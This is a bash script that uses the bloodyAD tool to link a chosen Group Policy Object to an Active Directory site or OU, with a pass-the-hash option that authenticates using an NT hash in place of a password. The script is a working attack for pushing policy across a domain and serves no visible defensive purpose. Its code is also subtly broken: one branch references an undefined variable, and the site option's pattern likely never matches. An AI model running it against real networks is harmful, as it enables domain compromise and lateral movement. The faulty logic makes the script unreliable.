#!/bin/bash

target_opt="$1"
domain="$2"
user="$3"
password="$4"
gpo_guid="$5"
target_ip="$6"

domain_prefix="$(echo $domain | cut -d'.' -f1)"
domain_suffix="$(echo $domain | cut -d'.' -f2)"
gpo_ldap_query="CN={$gpo_guid},CN=Policies,CN=System,DC=$domain_prefix,DC=$domain_suffix"

case "$target_opt" in
  "\-\-site")
    if [ -n "$(echo $password | grep -Eo '[0-9a-fA-F]{32}')" ]
    then
      # Pass the Hash
      bloodyAD -d $domain --host $target_ip -u $user -p aad3b435b51404eeaad3b435b51404ee:$password set object "CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=$domain_prefix,DC=$domain_suffix" GPLink -v "[LDAP://$gpo_ldap_query;0]"
    else
      bloodyAD -d $domain --host $target_ip -u $user -p $password set object "CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=$domain_prefix,DC=$domain_suffix" GPLink -v "[LDAP://$gpo_ldap_query;0]"
    fi
    ;;
  *)
    # Default = OU linkage
    if [ -n "$(echo $password | grep -Eo '[0-9a-fA-F]{32}')" ]
    then
      # Pass the Hash
      bloodyAD -d $domain --host $target_ip -u $user -p aad3b435b51404eeaad3b435b51404ee:$password set object "OU=$target_detail,DC=$domain_prefix,DC=$domain_suffix" GPLink -v "[LDAP://$gpo_ldap_query;0]"
    else
      bloodyAD -d $domain --host $target_ip -u $user -p $password set object "OU=$target_opt,DC=$domain_prefix,DC=$domain_suffix" GPLink -v "[LDAP://$gpo_ldap_query;0]"
    fi
    ;;
esac
